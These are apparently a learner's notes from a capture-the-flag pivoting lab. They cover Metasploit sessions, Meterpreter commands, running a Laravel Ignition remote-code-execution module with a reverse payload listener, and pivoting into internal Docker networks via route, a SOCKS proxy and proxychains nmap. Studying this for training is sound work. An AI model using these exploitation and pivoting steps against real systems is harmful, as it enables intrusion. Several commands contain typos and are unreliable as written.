# Day 9 [Pivoting] Dock the Halls

## What is Docker?
* **Docker** is a way to package applications and the associated dependencies into a single unit called an image
  * this image can be shared and run as a container either locally or remotely in prodcution
  * common way to tell if a compromised application is running in a Docker container is to verify the existence of a ```./dockerenv``` file at the root directory

## What is Metasploit?
* **Metsploit** is a powerfil penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivioting to other applications and systems
* developed and maintained by **Rapid7**

## What is a Metasploit Session?

* Often **Command Shells/Meterpreter** sessions which allow for executing commnads against the target
* can also open up other session types, ie. **SSH / WinRm**
* common console commands:
#### View sessions
```
sessions
```
#### Upgrade the last opened session to Meterpeter
```
sessions -u -1
```
#### Interact with a session
```
sessions -i [session_id]
```
#### Background the currently interactive session and go back to the Metasploit prompt
```
background
```
### What is a Meterpreter
* **Meterpreter** is an advanced payload that provides interactive access to a compromised system
  * can upload/download files or pivot utilizing a meterpreter session
  * Normal command shells do not suppoer complex operation such as pivoting
* some useful commands in a meterpreter:

#### Get information about the remote system, ie OS
```
sysinfo
```
#### Upload a file or directory
```
upload local_file.txt
```
#### Display interfaces
```
ipconfig
```
#### Resolve a set of host names on the targer to IP addresses
```
resovle remote_service1 remote_service2
```

## What is Pivoting?
* once intial entry is gained, the compromised machine can be used to send additional web traffic to previously inaccessible machines
* network scanning tools such as **nmap or arp** can be be run from this compromised machine to locate additional machines/services that were previously inaccessible


## Using Metasploit
* Metasploit can be started by running the commmand ```msfconsole``
* comman commands:

##### To search for a module, use the 'search' command
```
msf6 > search laravel
```
#### Load a modile with the 'use; command:
```
msf6 > use mutli/php/ignition_laravel_debug_rce
```
#### View the information about the module, including the module options, description, CVE details, etc
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > info
```
#### View available options to set
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > show options
```
#### Set the target host and logging
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set RHOST [MACHINE_IP]
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set verbose true
```
#### Set the payload listening addressl this is the IP address of the host running Metasploit
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set LHOST [LITEN_IP]
```
#### Show options again with those that are set
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > show options
```
#### Run or check the module
```
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > check
msf6 exploit(mutli/php/ignition_laravel_debug_rce) > run
```

### Using Metasploit to pivot
* Metasploit has an interanl routing table that can be modified with the ```route``` command
  * this routing table determines wehere to send network traffic through, this way we are using the Meterpreter to pivot
* the top-level ```route``` command is not the same as the one used in a Meterpreter session, you will need to background this session before utilizing the top-level command
* Usage:

#### Example usage
```
msf6 > route [add/remove] subnet netmask ]comm/sid]
```
#### Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
```
msf6 > route add 172.17.0.1/32 -1
```
#### Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
```
msf6 > route add 172.28.10.48/29 -1
```
#### Output the routing table
```
msf6 > route print
```

### Socks Proxy

* **Socks Proxy** is an intermediate server that supports relaying networking traffic between two machines
* allows you to implement pivoting
* can be run locally or on the remote compromised machine
```
msf6 > auxiliary/server/socks_proxy
msf6 > run SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
```
#### Can send curl requests using the --proxy flag
```
msf6 > curl --proxy socks4a://127.0.0.1:9050 http://[MACHINE IP]
```
#### If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool's request to open a new network connection and route the request through a socks proxy 
```
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 [MACHINE IP]
```















